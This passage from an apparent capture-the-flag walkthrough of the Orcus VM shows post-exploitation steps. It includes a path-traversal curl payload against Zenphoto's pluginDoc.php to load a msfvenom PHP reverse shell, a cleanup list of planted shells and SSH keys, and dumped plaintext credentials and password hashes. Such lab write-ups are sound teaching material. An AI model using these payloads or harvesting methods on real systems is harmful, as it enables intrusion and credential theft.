+<div>Also, in the /etc directory we see a folder for 'kippo'. Checking the config file, we see that it is set up to listen on port 22. Incidentally, we also see a "flag" in the file.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>bash-4.3# cd /etc/kippo</div>
+    <div>bash-4.3# cat kippo.cfg</div>
+    <div>cat kippo.cfg</div>
+    <div>#</div>
+    <div># Kippo configuration file (kippo.cfg)</div>
+    <div>#</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[honeypot]</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div># IP addresses to listen for incoming SSH connections.</div>
+    <div>#</div>
+    <div># (default: 0.0.0.0) = any address</div>
+    <div>#ssh_addr = 0.0.0.0</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div># Port to listen for incoming SSH connections.</div>
+    <div># user:1:TH!SP4SSW0RDIS4Fl4G!</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div># (default: 2222)</div>
+    <div>ssh_port = 22</div>
+    <div><br /></div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div>Checking the running processes (ps -aux) and open ports (lsof -i -Pn), it doesn't appear that kippo is actually running, but we'll be on the safe side and SSH using TCP port 443.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# ssh -p 443 -i orcus root@10.183.0.220</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>*** REMOVE /var/www/html/zenphoto/uploaded/rev.php ***</div>
+<div>*** STOP /var/www/html/zenphoto/cache/thumb ***</div>
+<div>*** REMOVE /var/www/html/zenphoto/cache/thumb ***</div>
+<div>*** REMOVE /tmp/bash ***</div>
+<div>*** REMOVE ssh key from /root/.ssh/authorized_keys ***</div>
+<div>*** REMOVE /tmp/rev.php ***</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Flags</span></div>
+<div><br /></div>
+<div>The first flag can be found in /var/www.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Orcus:/var/www$ cat flag.txt</div>
+    <div>cat flag.txt</div>
+    <div>868c889965b7ada547fae81f922e45c4</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Using the Zenphoto LFI vulnerability</span></div>
+<div><br /></div>
+<div>Because of the accessible NFS share, we could use the Zenphoto LFI vulnerability to retrieve our PHP reverse shell from /tmp. That would involve mounting /tmp on our attacking machine, copying over our PHP reverse shell (created earlier with msfvenom) and then using the following curl command to access it.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>curl 'http://10.183.0.220/zenphoto/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../../../../../tmp/rev'</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">ssh-creds.bak</span></div>
+<div><br /></div>
+<div>In revisiting the 'ssh-creds.bak' file in the /var/www/html/backups directory, we find that it is just junk. The username/password combo doesn't work. Just another red herring.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Orcus:/var/www/html/backups# cat ssh-creds.bak </div>
+    <div>root:123456</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">phpmyadmin.conf</span></div>
+<div><br /></div>
+<div>We found a username and password in the phpmyadmin.conf file in /etc/dbconfig-common. We tried the credentials on the /phpmyadmin site and they worked. Unfortunately, as seen in a screenshot above, the phpmyadmin user doesn't actually have any db privs.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Orcus:/etc/dbconfig-common# cat phpmyadmin.conf</div>
+    <div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div>
+    <div># dbc_dbuser: database user</div>
+    <div>#       the name of the user who we will use to connect to the database.</div>
+    <div>dbc_dbuser='phpmyadmin'</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div># dbc_dbpass: database user password</div>
+    <div>#       the password to use with the above username when connecting</div>
+    <div>#       to a database, if one is required</div>
+    <div>dbc_dbpass='sX6yATfXjVyf'</div>
+    <div>
+        <div>[...]</div>
+    </div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Adem</span></div>
+<div><br /></div>
+<div>The db.php file in /var/www/html/Adem contains more credentials. We tried the credentials on the /phpmyadmin site and they did NOT work.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Orcus:/var/www/html/Adem# cat db.php</div>
+    <div>&lt;?php</div>
+    <div>/**</div>
+    <div> * @package Adem</div>
+    <div> * @version 0.2</div>
+    <div> * @since 0.1</div>
+    <div> * @category connect DB</div>
+    <div> * @author Fares AlBelady</div>
+    <div> */</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>// ضع اسم قاعدة البيانات</div>
+    <div>// SET YOUR DB NAME</div>
+    <div>define("DB_NAME","Adem");</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>// ضع اسم المستخدم لقاعدة البيانات</div>
+    <div>// SET YOUR DB USER</div>
+    <div>define("DB_USER","root");</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>// ضغ كلمة المرور لقاعدة البيانات</div>
+    <div>// SET YOUR DB PASSWORD</div>
+    <div>define("DB_PASS","");</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>// ضع مستضيف قاعدة البيانات ، في العادة يكون بقيمة ( localhost ) إذا حدث خطأ راسل مستضيفك ليعطيك الاسم الخاص به .</div>
+    <div>// SET YOUR DB HOST , default is be ( localhost ) </div>
+    <div>define("DB_HOST","localhost");</div>
+    <div><br /></div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div>Additionally, the adem.sql file defines a default password for settings.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Orcus:/var/www/html/Adem# cat adem.sql</div>
+    <div>[...]</div>
+    <div>INSERT INTO `settings` (`sid`, `sett_name`, `sett_value`) VALUES</div>
+    <div>(1, 'site_url', 'ضع رابط موقع هنا . - put your website url here'),</div>
+    <div>(2, 'site_name', ''),</div>
+    <div>(3, 'site_descrip', ''),</div>
+    <div>(4, 'google_code', ''),</div>
+    <div>(5, 'email', ''),</div>
+    <div>(6, 'password', '8a8e83876e81242bee8a620b2967dc33'),</div>
+    <div>(9, 'site_keywords', ''),</div>
+    <div>(8, 'visits', ''),</div>
+    <div>(7, 'last_login', ''),</div>
+    <div>(10, 'theme_name', 'default');</div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div>Looking at the ad-user.php file, it appears that passwords are double md5 encoded before being checked against the database.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Orcus:/var/www/html/Adem# cat ad-user.php</div>
+    <div>[...]</div>
+    <div>                if(isset($_POST['password'])){</div>
+    <div>                    $return = [];</div>
+    <div>                    if(!empty($_POST['password'])){</div>
+    <div>                        $post_password = clearPOST($_POST['password']);</div>
+    <div>                        $passINDB = $loginDB-&gt;getSettingVal("password");</div>
+    <div>                        $passwordMD5 = md5(md5($post_password));</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>                        if($passwordMD5 == $passINDB){</div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div>I decided to submit this hash to the MD5 Cracker Page here <a href="https://hashkiller.co.uk/Cracker/MD5" target="_blank">https://hashkiller.co.uk/Cracker/MD5</a> and got a result... though not a surprising one.</div>
+<div><br /></div>
+<div><img height="134" src="/assets/images/2019-04-15-hackfest2016-orcus/8EC0B7DD-372A-4EE1-B074-0F42E2CB6993.png" width="964" /><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
